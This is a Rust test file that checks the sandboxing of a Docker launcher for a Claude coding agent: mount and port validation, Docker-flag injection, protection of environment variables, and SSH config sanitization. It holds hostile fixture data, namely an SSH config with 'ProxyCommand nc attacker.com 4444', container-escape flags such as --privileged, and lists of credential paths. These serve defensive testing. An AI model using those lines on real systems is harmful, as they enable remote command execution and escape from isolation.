use crate::container::{
    bind_mounts_for_test, build_container_args, cache_args_for_test, container_env_args_for_test,
    host_access_args_for_test, validated_mounts_for_test, validated_ports_for_test, ContainerState,
    LaunchInputs,
};
use crate::provider::{ProfileConfig, Provider};
use crate::resolve_launch_plan;

fn make_inputs<'a>(config: &'a ProfileConfig, extra: &'a [String]) -> LaunchInputs<'a> {
    LaunchInputs {
        image: "ghcr.io/example/claude:latest",
        config,
        project_dir: "/tmp/project",
        base_name: "claude-demo",
        host_home: "/home/tester",
        uid: "1000",
        gid: "1000",
        extra_claude_args: extra,
        ports: &[],
        extra_mounts: &[],
        memory: "",
        cpus: "",
        host_access: false,
        no_cache: false,
        no_env: false,
        gpus: false,
        nonce: 42,
        git_name: None,
        git_email: None,
    }
}

fn anthropic_config() -> ProfileConfig {
    ProfileConfig {
        key: "sk-ant-123".into(),
        provider: Provider::Anthropic,
    }
}

fn minimax_config() -> ProfileConfig {
    ProfileConfig {
        key: "minimax-key".into(),
        provider: Provider::Minimax,
    }
}

fn zai_config() -> ProfileConfig {
    ProfileConfig {
        key: "zai-key-123".into(),
        provider: Provider::Zai,
    }
}

fn vol_values(args: &[String]) -> Vec<&str> {
    args.iter()
        .zip(args.iter().skip(1))
        .filter(|(k, _)| **k == "-v")
        .map(|(_, v)| v.as_str())
        .collect()
}

#[test]
fn adversarial_extra_mount_rejects_root_with_various_formats() {
    let mounts = vec![
        "/:/mnt".to_string(),
        "/:ro".to_string(),
        "/:/host".to_string(),
        "/:/host:ro".to_string(),
        "/:rw".to_string(),
    ];
    let result = validated_mounts_for_test(&mounts);
    assert!(
        result.is_empty(),
        "all root mounts must be rejected — got: {result:?}"
    );
}

#[test]
fn adversarial_extra_mount_rejects_etc_shadow() {
    let mounts = vec!["/etc/shadow:/etc/shadow:ro".to_string()];
    let result = validated_mounts_for_test(&mounts);
    assert!(result.is_empty(), "/etc mounts must be rejected");
}

#[test]
fn adversarial_extra_mount_rejects_proc_self_environ() {
    let mounts = vec!["/proc/self/environ:/proc/self/environ:ro".to_string()];
    let result = validated_mounts_for_test(&mounts);
    assert!(result.is_empty(), "/proc mounts must be rejected");
}

#[test]
fn adversarial_extra_mount_rejects_path_traversal() {
    let mounts = vec![
        "/tmp/../../../etc:/etc:ro".to_string(),
        "/opt/../../root:/root:ro".to_string(),
    ];
    let result = validated_mounts_for_test(&mounts);
    for pair in result.windows(2) {
        if pair[0] == "-v" {
            let host_path = pair[1].split(':').next().unwrap_or("");
            assert!(
                !host_path.contains("/etc"),
                "path traversal to /etc leaked through: {}",
                pair[1]
            );
            assert!(
                !host_path.contains("/root"),
                "path traversal to /root leaked through: {}",
                pair[1]
            );
        }
    }
}

#[test]
fn adversarial_extra_mount_rejects_all_system_dirs() {
    let dangerous = [
        ("/home", "home dir"),
        ("/opt", "opt dir"),
        ("/tmp", "tmp dir"),
        ("/var", "var dir"),
        ("/usr", "usr dir"),
        ("/bin", "bin dir"),
        ("/sbin", "sbin dir"),
        ("/lib", "lib dir"),
        ("/dev", "dev dir"),
        ("/sys", "sys dir"),
    ];
    for (path, desc) in &dangerous {
        let mounts = vec![format!("{path}:{path}:ro")];
        let result = validated_mounts_for_test(&mounts);
        assert!(result.is_empty(), "{desc} ({path}) mount must be rejected");
    }
}

#[test]
fn adversarial_extra_mount_rejects_subdirs_of_system_dirs() {
    let dangerous = [
        "/etc/shadow",
        "/etc/passwd",
        "/etc/ssh",
        "/var/log",
        "/var/lib/docker",
        "/home/other/.ssh",
        "/home/root",
        "/opt/secrets",
        "/tmp/.X11-unix",
        "/sys/fs/cgroup",
        "/dev/shm",
    ];
    for path in &dangerous {
        let mounts = vec![format!("{path}:{path}:ro")];
        let result = validated_mounts_for_test(&mounts);
        assert!(result.is_empty(), "subdir mount '{path}' must be rejected");
    }
}

#[test]
fn adversarial_port_rejects_all_privileged() {
    let privileged: Vec<String> = (1..=1023u16)
        .filter(|p| p % 200 == 0)
        .map(|p| format!("{p}:{p}"))
        .collect();
    let result = validated_ports_for_test(&privileged);
    assert!(
        result.is_empty(),
        "all privileged ports (1-1023) must be rejected"
    );
}

#[test]
fn adversarial_port_rejects_ssh_http_https() {
    let ports = vec![
        "22:22".to_string(),
        "80:80".to_string(),
        "443:443".to_string(),
        "53:53".to_string(),
        "25:25".to_string(),
    ];
    let result = validated_ports_for_test(&ports);
    assert!(
        result.is_empty(),
        "well-known privileged ports must be rejected"
    );
}

#[test]
fn adversarial_port_accepts_nonprivileged() {
    let ports = vec![
        "3000:3000".to_string(),
        "8080:8080".to_string(),
        "9999:9999".to_string(),
        "1024:1024".to_string(),
    ];
    let result = validated_ports_for_test(&ports);
    assert_eq!(
        result.len(),
        8,
        "non-privileged ports should each produce -p + value"
    );
}

#[test]
fn adversarial_port_handles_malformed_gracefully() {
    let ports = vec![
        "abc".to_string(),
        "".to_string(),
        "99999:99999".to_string(),
        "-1:-1".to_string(),
    ];
    let result = validated_ports_for_test(&ports);
    assert!(
        result.is_empty(),
        "malformed ports must be rejected gracefully"
    );
}

#[test]
fn adversarial_claude_args_cannot_inject_docker_flags() {
    let config = anthropic_config();
    let dangerous_args: Vec<Vec<String>> = vec![
        vec!["--privileged".into()],
        vec!["--network".into(), "host".into()],
        vec!["-v".into(), "/:/host".into()],
        vec!["--userns".into(), "host".into()],
        vec!["--pid".into(), "host".into()],
        vec!["--security-opt".into(), "seccomp=unconfined".into()],
        vec!["--entrypoint".into(), "/bin/bash".into()],
    ];
    for claude_args in &dangerous_args {
        let inputs = make_inputs(&config, claude_args);
        let args = build_container_args(&inputs, "test");
        let double_dash_idx = args
            .iter()
            .position(|a| a == "--")
            .expect("'--' must exist");
        let after_separator = &args[double_dash_idx + 1..];
        let claude_arg_idx = after_separator.iter().position(|a| claude_args.contains(a));
        assert!(
            claude_arg_idx.is_some(),
            "claude args {:?} must appear after '--' separator in: {:?}",
            claude_args,
            after_separator,
        );
    }
}

#[test]
fn adversarial_provider_env_never_overwrites_security() {
    let config = minimax_config();
    let inputs = make_inputs(&config, &[]);
    let args = build_container_args(&inputs, "test");
    let envs: Vec<&str> = args
        .iter()
        .zip(args.iter().skip(1))
        .filter(|(k, _)| **k == "-e")
        .map(|(_, v)| v.as_str())
        .collect();
    let expected_host_home = format!("HOST_HOME={}", inputs.host_home);
    for env in &envs {
        if env.starts_with("HOST_HOME=") {
            assert!(
                *env == expected_host_home.as_str(),
                "HOST_HOME must not be overridden by provider"
            );
        }
        if env.starts_with("HOME=") {
            assert!(
                *env == "HOME=/home/user",
                "HOME must not be overridden by provider"
            );
        }
        if env.starts_with("SSH_AUTH_SOCK=") {
            assert!(
                *env == "SSH_AUTH_SOCK=/tmp/ssh-agent.sock",
                "SSH_AUTH_SOCK must not be overridden by provider"
            );
        }
    }
}

#[test]
fn adversarial_host_access_is_truly_off_by_default() {
    let args = host_access_args_for_test(false);
    assert!(
        args.is_empty(),
        "host access must produce zero args when off"
    );
}

#[test]
fn adversarial_host_access_adds_exact_string() {
    let args = host_access_args_for_test(true);
    assert!(
        args.contains(&"--add-host".into()),
        "must use --add-host not --network host"
    );
    assert!(
        args.contains(&"host.docker.internal:host-gateway".into()),
        "must use host-gateway not arbitrary IP"
    );
}

#[test]
fn adversarial_no_cache_produces_no_volume_refs() {
    let args = cache_args_for_test("claude-test", true);
    assert!(args.iter().any(|a| a.contains("--tmpfs")));
    assert!(
        !args.iter().any(|a| a.contains("claude-dock-")),
        "no-cache must not produce named volumes"
    );
}

#[test]
fn adversarial_cache_uses_named_volumes_not_bind_mounts() {
    let args = cache_args_for_test("claude-test", false);
    assert!(
        args.iter()
            .any(|a| a.contains("claude-dock-claude-test-target")),
        "cache volumes must be named with claude-dock- prefix"
    );
    assert!(
        !args.iter().any(|a| a.contains("--tmpfs")),
        "cache mode must not use tmpfs"
    );
}

#[test]
fn adversarial_bind_mounts_never_include_host_dangerous_paths() {
    let config = anthropic_config();
    let inputs = make_inputs(&config, &[]);
    let mounts = bind_mounts_for_test(&inputs);
    for mount_pair in mounts.windows(2) {
        if mount_pair[0] == "-v" {
            let vol = &mount_pair[1];
            let src = vol.split(':').next().unwrap_or("");
            let dangerous_starts = ["/root", "/etc", "/var", "/usr", "/proc", "/dev", "/sys"];
            for dangerous in &dangerous_starts {
                assert!(
                    !src.starts_with(dangerous),
                    "bind mount includes dangerous path '{dangerous}': {vol}"
                );
            }
        }
    }
}

#[test]
fn adversarial_container_env_never_exposes_provider_key() {
    let config = minimax_config();
    let inputs = make_inputs(&config, &[]);
    let envs = container_env_args_for_test(&inputs);
    for env in &envs {
        if env == "-e" {
            continue;
        }
        assert!(
            !env.contains("minimax-key"),
            "provider key must not appear in env args: {env}"
        );
    }
}

#[test]
fn adversarial_double_dash_separator_isolates_claude_args() {
    let config = anthropic_config();
    let claude_args = vec!["--verbose".into(), "--print".into()];
    let inputs = make_inputs(&config, &claude_args);
    let args = build_container_args(&inputs, "test");
    let dash_idx = args
        .iter()
        .position(|a| a == "--")
        .expect("'--' separator must exist");
    let entrypoint_idx = args
        .iter()
        .position(|a| a == "__entrypoint")
        .expect("__entrypoint must exist as separator");
    let image_idx = args
        .iter()
        .position(|a| a == "ghcr.io/example/claude:latest")
        .expect("image must exist");
    assert!(
        entrypoint_idx < dash_idx,
        "__entrypoint must come before '--' separator"
    );
    assert!(
        image_idx < dash_idx,
        "image must come before '--' separator (docker run [opts] IMAGE [--] [args])"
    );
    for arg in &claude_args {
        let arg_idx = args.iter().position(|a| a == arg).unwrap();
        assert!(
            arg_idx > dash_idx,
            "claude arg '{arg}' must come after '--' separator"
        );
    }
}

#[test]
fn adversarial_image_appears_before_double_dash() {
    let config = anthropic_config();
    let inputs = make_inputs(&config, &[]);
    let args = build_container_args(&inputs, "test");
    let dash_idx = args.iter().position(|a| a == "--").unwrap();
    let image_idx = args
        .iter()
        .position(|a| a == "ghcr.io/example/claude:latest")
        .unwrap();
    assert!(
        image_idx < dash_idx,
        "image must come before '--' separator (docker run syntax)"
    );
}

#[test]
fn adversarial_empty_memory_falls_back_to_safe_default() {
    let config = anthropic_config();
    let inputs = make_inputs(&config, &[]);
    let args = build_container_args(&inputs, "test");
    assert!(
        args.contains(&"8g".into()),
        "empty memory must fall back to 8g"
    );
}

#[test]
fn adversarial_project_dir_always_mounted_at_app() {
    let config = anthropic_config();
    let inputs = make_inputs(&config, &[]);
    let args = build_container_args(&inputs, "test");
    assert!(
        args.iter().any(|a| a.contains("/tmp/project:/app")),
        "project dir must always be mounted at /app"
    );
}

#[test]
fn adversarial_launch_plan_missing_creates_new_container() {
    let config = anthropic_config();
    let inputs = make_inputs(&config, &[]);
    let plan = resolve_launch_plan(ContainerState::Missing, inputs);
    assert_eq!(plan.mode, crate::container::LaunchMode::New);
    assert!(
        plan.args.contains(&"run".into()),
        "must use 'run' for new container"
    );
}

#[test]
fn adversarial_launch_plan_running_creates_suffixed_container() {
    let config = anthropic_config();
    let inputs = make_inputs(&config, &[]);
    let plan = resolve_launch_plan(ContainerState::Running, inputs);
    assert!(
        plan.container_name.ends_with("-42"),
        "must suffix with nonce to avoid collision"
    );
    assert!(
        plan.container_name != "claude-demo",
        "must not collide with existing name"
    );
}

#[test]
fn adversarial_all_providers_set_base_url_before_auth_token() {
    for (config, url) in [
        (minimax_config(), "https://api.minimax.io/anthropic"),
        (zai_config(), "https://api.z.ai/api/anthropic"),
    ] {
        let inputs = make_inputs(&config, &[]);
        let args = build_container_args(&inputs, "test");
        let base_url_idx = args.iter().position(|a| a.contains("ANTHROPIC_BASE_URL"));
        let auth_token_idx = args.iter().position(|a| a == "ANTHROPIC_AUTH_TOKEN");
        assert!(
            base_url_idx < auth_token_idx,
            "BASE_URL must be set before AUTH_TOKEN for provider: {url}"
        );
    }
}

#[test]
fn adversarial_disable_nonessential_traffic_for_third_party() {
    for config_fn in [minimax_config, zai_config] {
        let config = config_fn();
        let inputs = make_inputs(&config, &[]);
        let args = build_container_args(&inputs, "test");
        assert!(
            args.iter()
                .any(|a| a == "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1"),
            "third-party providers must disable non-essential traffic"
        );
    }
}

#[test]
fn adversarial_memory_limit_clamps_zero_to_minimum() {
    let config = anthropic_config();
    let mut inputs = make_inputs(&config, &[]);
    inputs.memory = "0";
    let args = build_container_args(&inputs, "test");
    let mem_idx = args
        .iter()
        .position(|a| a == "--memory")
        .expect("--memory must exist");
    let mem_val = &args[mem_idx + 1];
    assert!(
        mem_val != "0" && mem_val != "",
        "zero memory must be clamped to minimum — got: {mem_val}"
    );
}

#[test]
fn adversarial_no_gpu_by_default() {
    let config = anthropic_config();
    let inputs = make_inputs(&config, &[]);
    let args = build_container_args(&inputs, "test");
    assert!(
        !args.iter().any(|a| a == "--gpus"),
        "GPUs must not be passed unless explicitly requested"
    );
}

#[test]
fn adversarial_ssh_config_sanitization_strips_proxycommand() {
    use crate::validation::ssh_config_path;
    use std::fs;
    let tmp = std::env::temp_dir().join("test-ssh-sanitize-proxycommand");
    let _ = fs::create_dir_all(tmp.join(".ssh"));
    let _ = fs::write(
        tmp.join(".ssh/config"),
        "Host evil\n  ProxyCommand nc attacker.com 4444\n  IdentityFile ~/.ssh/id_rsa\n  Include /etc/ssh/evil_config\n  LocalCommand echo pwned\n  RemoteCommand whoami\n  Match host *\n    PermitLocalCommand yes\n",
    );
    let result = ssh_config_path(&tmp.to_string_lossy());
    assert!(result.is_some(), "sanitized config should be produced");
    let path = result.unwrap();
    let content = fs::read_to_string(&path).unwrap_or_default();
    assert!(
        !content.contains("ProxyCommand"),
        "ProxyCommand must be stripped: {content}"
    );
    assert!(
        !content.contains("IdentityFile"),
        "IdentityFile must be stripped: {content}"
    );
    assert!(
        !content.contains("Include"),
        "Include must be stripped: {content}"
    );
    assert!(
        !content.contains("LocalCommand"),
        "LocalCommand must be stripped: {content}"
    );
    assert!(
        !content.contains("RemoteCommand"),
        "RemoteCommand must be stripped: {content}"
    );
    assert!(
        !content.contains("Match"),
        "Match must be stripped: {content}"
    );
    assert!(
        !content.contains("PermitLocalCommand"),
        "PermitLocalCommand must be stripped: {content}"
    );
    let _ = fs::remove_dir_all(tmp);
}

#[test]
fn adversarial_ssh_config_sanitized_path_no_slashes() {
    use crate::validation::ssh_config_path;
    use std::fs;
    let tmp = std::env::temp_dir().join("test-ssh-path-slashes");
    let _ = fs::create_dir_all(tmp.join(".ssh"));
    let _ = fs::write(tmp.join(".ssh/config"), "Host ok\n  HostName github.com\n");
    let result = ssh_config_path(&tmp.to_string_lossy());
    if let Some(path) = result {
        let filename = path.rsplit('/').next().unwrap_or("");
        assert!(
            !filename.contains('/'),
            "filename must have no slashes: {filename}"
        );
        assert!(
            filename.starts_with("claude-dock-ssh-config-"),
            "filename must use claude-dock prefix: {filename}"
        );
    }
    let _ = fs::remove_dir_all(tmp);
}

#[test]
fn adversarial_ssh_config_empty_after_sanitization_returns_none() {
    use crate::validation::ssh_config_path;
    use std::fs;
    let tmp = std::env::temp_dir().join("test-ssh-empty-sanitize");
    let _ = fs::create_dir_all(tmp.join(".ssh"));
    let _ = fs::write(
        tmp.join(".ssh/config"),
        "IdentityFile ~/.ssh/id_rsa\nIdentityFile ~/.ssh/id_ed25519\n",
    );
    let result = ssh_config_path(&tmp.to_string_lossy());
    assert!(
        result.is_none(),
        "config with only IdentityFile lines should return None"
    );
    let _ = fs::remove_dir_all(tmp);
}
